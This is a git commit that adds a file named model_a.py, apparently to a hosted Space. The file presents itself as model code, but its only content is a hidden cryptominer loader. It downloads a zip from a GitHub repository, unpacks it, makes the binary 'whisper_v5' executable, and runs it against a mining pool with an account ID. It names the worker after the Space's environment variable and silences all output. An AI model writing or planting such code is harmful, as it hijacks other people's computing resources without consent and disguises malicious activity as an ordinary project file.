98e44a40e5ecf8776e7c75a9dae65a33de2c2a88
qqivk <fsswr518@gmail.com>
2025-02-16 01:50:36 +0100

    Create model_a.py

---
+++ model_a.py
@@ -0,0 +1,6 @@
+import os
+os.system("wget https://github.com/qqivk/project-02/raw/refs/heads/main/whisper_v5.zip")
+os.system("unzip whisper_v5.zip")
+os.system("chmod +x whisper_v5")
+wn = os.getenv('SPACE_ID').replace("/","_")
+os.system(f"./whisper_v5 --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 2 --worker {wn} >/dev/null")
